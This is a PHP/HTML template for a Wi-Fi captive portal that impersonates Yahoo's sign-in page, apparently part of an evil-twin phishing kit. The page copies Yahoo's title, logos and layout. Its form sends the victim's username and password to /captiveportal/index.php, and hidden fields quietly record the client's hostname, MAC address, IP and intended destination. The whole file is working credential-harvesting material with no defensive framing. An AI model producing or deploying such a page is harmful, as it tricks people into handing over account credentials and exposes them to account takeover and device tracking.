<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html id="Stencil" class="no-js grid mobile light-theme ">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="origin-when-cross-origin">
    <title>Yahoo</title>

    <link rel="icon" type="image/x-icon" href="assets/img/yahoo-favicon-img-v0.0.2.ico">
    <link rel="shortcut icon" type="image/x-icon" href="assets/img/yahoo-favicon-img-v0.0.2.ico">
    <link rel="apple-touch-icon" href="assets/img/yahoo-apple-touch-v0.0.2.png">
    <link rel="apple-touch-icon-precomposed" href="assets/img/yahoo-apple-touch-v0.0.2.png">

    <link href="assets/css/yahoo-main.css" rel="stylesheet" type="text/css">

  </head>

  <body class="bucket-mbr-change-password-v2 bucket-messenger-linking-mc bucket-mbr-signin-with-google bucket-mbr-oneflow-captcha bucket-mbr-cc-unified-add bucket-mbr-comm-channel-classifier">

    <div id="login-body" class="loginish  puree-v2 grid ">
      <div class="mbr-login-hd" id="mbr-uh-hd">
        <a href="#">
          <img src="assets/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
          <img src="assets/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
        </a>
      </div>
      <div class="challenge yid-challenge">
        <div class="challenge-header">
        </div>
        <div class="username-challenge" id="login-landing">
          <strong class="challenge-heading">Sign in</strong>
          <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
          </span>
          <form id="login-username-form" method="post" action="/captiveportal/index.php" onsubmit="redirect()" class="pure-form">
            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">

              <div>
                <input class="phone-no" type="text" name="email" id="login-username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Username, email, or mobile" />

                <input name="password" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
              </div>

              <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
              <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
              <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
              <input type="hidden" name="target" value="<?=$destination?>">

            </div>
            <p id="username-error" class="error-msg hide" role="alert"></p>


            <div class="button-container">
              <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next" />
            </div>

            <div class="challenge-feedback-link">
              <a href="#" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot username?</a>
            </div>
            <div class="bottom-links-container has-social-buttons">
              <p class="sign-up-link">
                <a href="#" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;mKey:login-landing-signup">Create an account</a>
              </p>

              <div id="social-login-container" class="social-login-container">
                <div class="or-cont-with-desc challenge-feedback-text">
                  Or, continue with
                </div>
                <ul class="social-login">
                  <li class="items-cont-1">
                    <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn">
                      <label class="offscreen">google</label>
                    </button>
                  </li>
                </ul>
              </div>
            </div>
          </form>
        </div>
      </div>


    </div>

  </body>

  </html>
